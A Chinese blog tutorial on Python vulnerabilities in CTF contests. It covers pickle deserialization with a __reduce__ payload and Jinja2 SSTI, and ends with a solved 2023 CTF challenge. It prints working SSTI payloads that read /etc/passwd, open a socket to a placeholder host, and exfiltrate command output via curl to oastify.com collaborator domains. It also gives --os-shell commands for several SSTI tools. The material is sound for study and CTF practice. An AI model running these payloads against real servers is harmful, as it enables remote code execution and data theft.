+++
author = "Lulaide"
title = "Python常见漏洞"
date = "2025-04-11"
description = "CTF比赛中常见Python漏洞"
tags = [
    "渗透",
    "Python",
    "CTF"
]
categories = ["教程&文档"]
image = "cover.png"
+++
## Python反序列化漏洞
> Python 反序列化漏洞是指攻击者通过构造恶意的序列化数据，利用 Python 的 `pickle` 模块或其他序列化库，在服务器端执行任意代码或获取敏感信息的漏洞。Python 的 `pickle` 模块允许将 Python 对象转换为字节流（序列化），并可以将字节流转换回原始对象（反序列化）。

### 漏洞产生的原因
- **pickle ?**
pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。python能够实现的功能它也能实现。
- **pickle 的特性**
pickle 模块是为了简化对象的存储和传输而设计，其在反序列化时会重构对象，其中会调用对象的特殊方法，如 __reduce__ 或 __setstate__。这些方法在序列化协议中被用来决定如何重构对象。

| 序号 | 特殊方法             | 说明 |
|------|--------------------|------|
| 1    | **`__new__`**          | 在反序列化过程中，`__new__` 用于创建对象实例（分配内存），通常在对象的具体状态填充前被调用。 |
| 2    | **`__getnewargs__`**   | 当对象的 `__new__` 需要额外的构造参数时，若定义了该方法，它会返回一个包含这些参数的元组，这些参数将传递给 `__new__`。 |
| 3    | **`__reduce__`**       | 该方法返回一个元组，描述如何重构该对象。通常该元组包括一个可调用对象、其参数，及（可选）对象的状态信息。虽然主要用于序列化，但它提供的信息会直接影响反序列化时对象的重构过程。 |
| 4    | **`__reduce_ex__`**    | 与 `__reduce__` 类似，但该方法接收协议版本参数，能够根据不同的 pickle 协议返回不同的重构信息，是新版 pickle 推荐使用的接口。 |
| 5    | **`__getstate__`**     | 在序列化时会调用，用于获取对象的状态（如对象的属性字典）。反序列化时，这部分状态通常会传递给 `__setstate__`。注意：反序列化过程中并不会直接调用 `__getstate__`。 |
| 6    | **`__setstate__`**     | 在反序列化时调用，根据 `__getstate__` 得到的数据恢复或更新对象的内部状态。 |

- **reduce 方法和任意函数调用**
当对象实现了 __reduce__ 方法时，该方法返回一个元组，通常形式为 (callable, args)。在反序列化时，pickle 会调用这个可调用对象，并传入参数 args 来构造对象。攻击者可以利用这一特性来返回任意可调用的函数，比如 os.system，并指定恶意命令作为参数。这样一来，当 pickle.load() 被调用时，恶意函数就会被执行。

生成 Payload
```python
import pickle
import os
from base64 import b64encode, b64decode
class ExploitReduce:
    def __reduce__(self):
        # 返回一个元组，第一个元素是可调用对象 os.system，
        # 第二个元素是一个包含命令的元组，反序列化时将调用 os.system('echo "Exploited via __reduce__!"')
        return (os.system, ('echo "Exploited via __reduce__ method!"',))

malicious_payload = pickle.dumps(ExploitReduce())
print("生成的 pickle 数据:", b64encode(malicious_payload))
```
执行
```python
import pickle
from base64 import b64encode, b64decode
token = "gASVQgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCdlY2hvICJFeHBsb2l0ZWQgdmlhIF9fcmVkdWNlX18gbWV0aG9kISKUhZRSlC4="
token = pickle.loads(b64decode(token))
```
可以看到执行了 `echo "Exploited via __reduce__ method!"` 命令。
![](image-9.png)
### 为什么 执行时并没有导入 os 模块？
在序列化时（pickle.dumps()），将 ExploitReduce 类的实例转换为字节流。pickle 在反序列化时会自动导入所需的模块和类，因此在生成 payload 时不需要手动导入 os 模块。
## 网页模板渲染漏洞
> SSTI 是  Server-Side Template Injection 的缩写，意为服务端模板注入。它是指攻击者通过在输入中注入恶意代码，来操控服务器端的模板引擎，从而执行任意代码或获取敏感信息的攻击方式。SSTI 漏洞通常出现在使用模板引擎渲染网页的应用程序中，例如 Flask、Django、Jinja2 等。

| **框架**        | **默认模板引擎**                        |
|-----------------|----------------------------------------|
| Flask           | Jinja2                                 |
| Django          | Django模板引擎（Django Template Language） |
| FastAPI         | Jinja2（可选）                          |
| Pyramid         | Chameleon（默认），支持Mako、Jinja2    |
| Tornado         | Tornado模板引擎                        |
| Bottle          | SimpleTemplate（默认），支持Jinja2、Mako |
| Web2py          | Web2py模板引擎                         |
| CherryPy        | Mako（可选）                           |
| Falcon          | 无内置模板引擎（支持集成Jinja2等）      |
| Sanic           | Jinja2（可选）                          |
---
### 🌶️ Jinja2
> Jinja2 是一个现代的、设计优雅的 Python 模板引擎，常用于 Flask 等 Web 框架中。它允许开发者在 HTML 模板中嵌入 Python 代码，从而动态生成网页内容。Jinja2 的语法简单易懂，支持控制结构、过滤器和宏等功能，使得模板的编写和维护变得更加灵活和高效。

#### Jinja2 的基本语法
- **变量**：使用 `{{ variable }}` 来输出变量的值。
- **控制结构**：使用 `{% ... %}` 来编写控制结构，如循环和条件语句。
- **过滤器**：使用 `{{ variable | filter }}` 来对变量进行处理，如格式化日期、转换大小写等。
- **注释**：使用 `{# ... #}` 来添加注释，这些注释不会被渲染到最终的输出中。
- **宏**：使用 `{% macro name(args) %} ... {% endmacro %}` 来定义可重用的代码块，类似于函数。
- **继承**：使用 `{% extends "base.html" %}` 来继承其他模板，使用 `{% block content %} ... {% endblock %}` 来定义可重写的内容块。
- **管道**：使用 `{{ variable | filter1 | filter2 }}` 来对变量应用多个过滤器，过滤器按从左到右的顺序应用。
示例模板：
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
</head>
<body>
    <h1>{{ title }}</h1>
    <p>Hello, {{ name }}!</p>
    {% if items %}
        <ul>
        {% for item in items %}
            <li>{{ item }}</li>
        {% endfor %}
        </ul>
    {% else %}
        <p>No items found.</p>
    {% endif %}
</body>
</html>
```
相应的 Python 代码：
```python
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def index():
    data = {
        "title": "我的页面",
        "name": "Alice",
        "items": ["苹果", "香蕉", "橙子"]
    }
    return render_template("index.html", **data)

if __name__ == '__main__':
    app.run(debug=True)
```
在这个示例中，`index.html` 是一个 Jinja2 模板，包含了变量和控制结构。Flask 的 `render_template` 函数会将 Python 字典中的数据传递给模板，并渲染出最终的 HTML 页面。
![](image-1.png)

---

#### 渲染流程
在 Flask 中使用 Jinja2 渲染页面时，整个流程可概括如下：

1. **加载模板**  
   Flask 中调用 `render_template('index.html', key='value')`。
   
2. **Jinja2 查找模板并编译**  
   - 在指定的模板目录下找到 `index.html`，将模板文件读入内存。
   - 如果是首次渲染或配置发生改变（模板被修改、缓存失效），Jinja2 会把 `.html` 文件转换为内部可执行的 Python 代码并进行缓存。

3. **插值和执行**  
   - 将渲染调用中传入的上下文变量（如 `{'key': 'value'}`）应用到已编译的模板代码中。
   - 模板中包含的 `{{ }}`、`{% %}` 语句被替换或执行，形成最终的 HTML 字符串。

4. **返回结果**  
   - Jinja2 完成渲染后返回 HTML 字符串给 Flask，Flask 再将此字符串封装在 HTTP 响应中返回给用户浏览器。
---
#### SSTI 漏洞如何产生？
- **用户输入未经过滤**：如果应用程序直接将用户输入的数据传递给模板引擎，而不是使用 render_template 函数进行渲染，就可能导致SSTI漏洞。
- **模板引擎的特性**：虽然 Jinja2 模板引擎不能直接执行 Python 代码，但它允许使用一些内置函数和对象，这些函数和对象可以被攻击者利用来执行任意代码。
---
#### 漏洞示例
```python
from flask import Flask, request, render_template_string
app = Flask(__name__)
@app.route('/')
def index():
    user_input = request.args.get('name', '')
    template = "<h1>Hello, " + user_input + "!</h1>"
    return render_template_string(template)
if __name__ == '__main__':
    app.run(debug=True)
```
这个示例中，用户输入的 `name` 参数直接拼接到模板字符串中，而不是进行渲染。攻击者可以通过在 `name` 参数中注入 Jinja2 语法来执行任意代码。例如：
```bash
http://example.com/?name={{ config.items() }}
```
这将导致 Flask 渲染出所有配置项的列表，攻击者可以利用这个漏洞获取敏感信息。
![](image-2.png)
这个示例泄露了 Flask 应用的所有配置项，包括 SECRET_KEY 和 DEBUG 模式等敏感信息。
![](image-3.png)

---
#### 漏洞利用
- 框架会自动将一些全局对象注入到模板上下文中，例如 `config`、`request`、`session` 等。攻击者可以利用这些对象来执行任意代码或获取敏感信息。
下面是一个简明的表格，列出了 Flask 模板中常用的全局对象及其使用方法和示例：

| 全局对象   | 描述                                                         | 在模板中的使用方法                                      | 示例代码                                                   |
|------------|--------------------------------------------------------------|---------------------------------------------------------|------------------------------------------------------------|
| **config** | 表示 Flask 应用的配置字典，包含调试模式、密钥、数据库等信息。    | 通过索引（如 `config['DEBUG']`）或 `config.get('KEY')` 访问。 | `{{ config['DEBUG'] }}` 显示 DEBUG 模式状态。              |
| **request**| 表示当前 HTTP 请求对象，包含请求方法、查询参数、表单数据、请求头等。| 访问对象属性，如 `request.method`、`request.args` 等。  | `<p>请求方法：{{ request.method }}</p>`<br>`<p>查询参数：{{ request.args.get('name', '访客') }}</p>` |
| **session**| 用于存储跨请求会话的数据（如用户登录信息）。                     | 直接访问存储在 session 中的数据，如 `session.username`。  | `{% if session.username %}<p>欢迎回来，{{ session.username }}！</p>{% endif %}` |
| **g**      | 一个用于在单次请求中存放临时数据的全局命名空间。                   | 直接使用属性访问，如 `g.user`。                          | `{% if g.user %}<p>当前用户：{{ g.user }}</p>{% endif %}`      |
| **url_for**| 一个函数，用于根据视图函数名称生成 URL，避免硬编码路径。           | 在模板中直接调用，如 `url_for('index')`。                | `<a href="{{ url_for('index') }}">首页</a>`                 |

##### 读取远程文件
```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File 类
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```
##### 在不猜测偏移量的情况下调用 Popen

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```
##### 在 Blind RCE 中强制输出
```python
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```
##### 常用过滤器

| 过滤器          | 描述                                                                                           | 常见利用方法                                                         |
|-----------------|------------------------------------------------------------------------------------------------|----------------------------------------------------------------------|
| `attr(name)`     | 动态访问对象的属性。                                                                            | 利用该过滤器通过反射访问对象的内部属性，攻击者可以获取类或对象的隐私信息或执行恶意操作。|
| `get(attribute)` | 获取对象的指定属性。                                                                            | 和 `attr` 类似，攻击者可以用来访问对象属性，也可以动态构造属性名。   |
| `join(delim)`    | 将一个列表连接成一个字符串，使用指定的分隔符。                                                    | 攻击者可以用它来拼接特定的字符串，然后通过 `attr` 访问对象的属性。    |
| `default(value)` | 如果变量为空或未定义，则返回指定的默认值。                                                       | 用来处理空值，可以避免触发 `None` 错误，确保攻击代码继续执行。         |
| `replace(old, new)` | 替换字符串中的部分内容。                                                                       | 结合 `attr` 或动态拼接字符串，攻击者可以构造注入有效负载。           |
| `safe`           | 标记字符串为“安全”，不对其进行转义。                                                           | 攻击者可以用它绕过 HTML 或 JavaScript 的转义，使注入的代码能够执行。  |
| `tojson()`       | 将数据结构转换为 JSON 字符串。                                                                  | 用于序列化数据，可以帮助攻击者在反序列化过程中注入恶意数据。           |
| `to_yaml()`      | 将数据结构转换为 YAML 格式。                                                                    | 与 `tojson` 类似，用于向目标系统发送恶意数据，绕过反序列化安全检查。    |
| `escape`         | 转义 HTML 字符，防止 XSS 攻击。                                                                  | 如果过滤器被错误使用，攻击者可以利用它插入可执行的 JavaScript。       |
| `urlencode`      | 对字符串进行 URL 编码。                                                                         | 用来绕过 URL 参数中可能的限制，尤其是输入过滤不严格的情况下。         |
| `file`           | 从文件中读取内容。                                                                               | 如果应用允许访问文件，攻击者可以通过该过滤器读取服务器上的敏感文件。  |
| `float`          | 将变量转换为浮点数。                                                                             | 攻击者可以利用它来操作数值或绕过类型检查。                           |
| `exec()`         | 动态执行代码。                                                                                 | 用来执行动态生成的代码或命令，极为危险，攻击者可通过它执行任意代码。  |

---


### 🌏 相关链接
- **文章**
    - [@0xAwali](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)
    - [PayloadAllTheThing](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/)
- **工具**
    - [焚靖](https://github.com/Marven11/FenJing)
    ```bash
    python -m fenjing scan --url 'http://xxxx:xxx/yyy'
    ```
    - [TInjA](https://github.com/Hackmanit/TInjA)
    ```bash
    python TInjA.py -u 'http://xxxx:xxx/yyy' --os-shell
    ```
    - ~~[tqlmap](https://github.com/epinna/tplmap)~~ 已被 SSTImap 替代
    ```bash
    python2 tplmap.py -u 'http://xxxx:xxx/yyy' --level 5 --risk 3 --os-shell
    ```
    - [SSTImap](https://github.com/vladko312/SSTImap)
    ```bash
    python3 sstimap.py -u 'http://xxxx:xxx/yyy' --os-shell
    ```



## ✨一些小 tips

### DNS、HTTP 外带
- **BurpSuite** -> Collaborator
> 支持的协议有：HTTP、SMTP、DNS

SSTI 利用示例
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("curl -X POST -d \"$(echo 'Hello, world!')\" le356fozyepn25q7d27mpfhdn4tvhv5k.oastify.com").read() }}
```
![](image.png)

#### 极客大挑战2023-web-klf_ssti
使用 `{{` 有报错，无论什么语句都显示 klf别想
![](image-4.png)
![](image-5.png)
可能可以成功执行，但是没有回显
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("curl 9lvtd3vn52wb9txvkqeaw3o1us0jokc9.oastify.com/?rqs=$(ls|base64)").read() }}
```
这里接收到了命令结果
![](image-6.png)
![](image-7.png)
出 flag
![](image-8.png)
```flag
GEEK{191de2a1-5092-428e-89a7-8aa482c7ddc8}
```